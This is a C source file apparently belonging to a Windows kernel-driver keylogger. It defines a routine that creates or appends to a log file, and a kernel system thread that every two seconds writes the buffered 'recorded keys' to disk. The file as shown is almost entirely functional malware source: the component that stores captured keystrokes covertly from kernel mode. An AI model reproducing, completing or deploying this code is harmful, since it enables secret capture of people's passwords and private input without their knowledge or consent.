#include <main.h>

EX_RUNDOWN_REF WriterRef;

void WriterWait(LONG milliseconds)
{
	INT64 interval = milliseconds * -10000i64;
	KeDelayExecutionThread(KernelMode, FALSE, (PLARGE_INTEGER)&interval);
}


NTSTATUS WriteKeys(PUCHAR data, ULONG dataSize) {
    UNICODE_STRING filePath;
    RtlInitUnicodeString(&filePath, LOG_FILE);
    NTSTATUS status;
    OBJECT_ATTRIBUTES objectAttributes;
    HANDLE fileHandle;
    IO_STATUS_BLOCK ioStatus;

    InitializeObjectAttributes(&objectAttributes,
        &filePath,
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
        NULL,
        NULL);

    status = ZwOpenFile(&fileHandle,
        FILE_APPEND_DATA | SYNCHRONIZE,
        &objectAttributes,
        &ioStatus,
        FILE_SHARE_WRITE,
        FILE_SYNCHRONOUS_IO_NONALERT);

    if (!NT_SUCCESS(status)) {
        // file does not exist yet  , create it 
        if (status == STATUS_OBJECT_NAME_NOT_FOUND) {
            ULONG createDisposition = FILE_OPEN_IF; 
            ULONG fileAttributes = FILE_ATTRIBUTE_NORMAL; 

            status = ZwCreateFile(&fileHandle,
                FILE_APPEND_DATA | SYNCHRONIZE,
                &objectAttributes,
                &ioStatus,
                NULL,
                fileAttributes,
                0,
                createDisposition,
                0,
                NULL,
                0);
        }

        if (!NT_SUCCESS(status)) {
            return status;
        }
    }

    status = ZwWriteFile(fileHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        data,
        dataSize,
        NULL,
        NULL);


    ZwClose(fileHandle);

    return status;
}


void Writer(PVOID StartContext)
{

	ExAcquireRundownProtection(&WriterRef);
	NTSTATUS status;
	while (!Unload)
	{
		if (WriteSignal)
		{
			DbgPrint("[*] writing recorded keys\n");
			Recording.Write();
			WriteSignal = false;
		}
		WriterWait(2000);
	}
	ExReleaseRundownProtection(&WriterRef);
	PsTerminateSystemThread(STATUS_SUCCESS);
}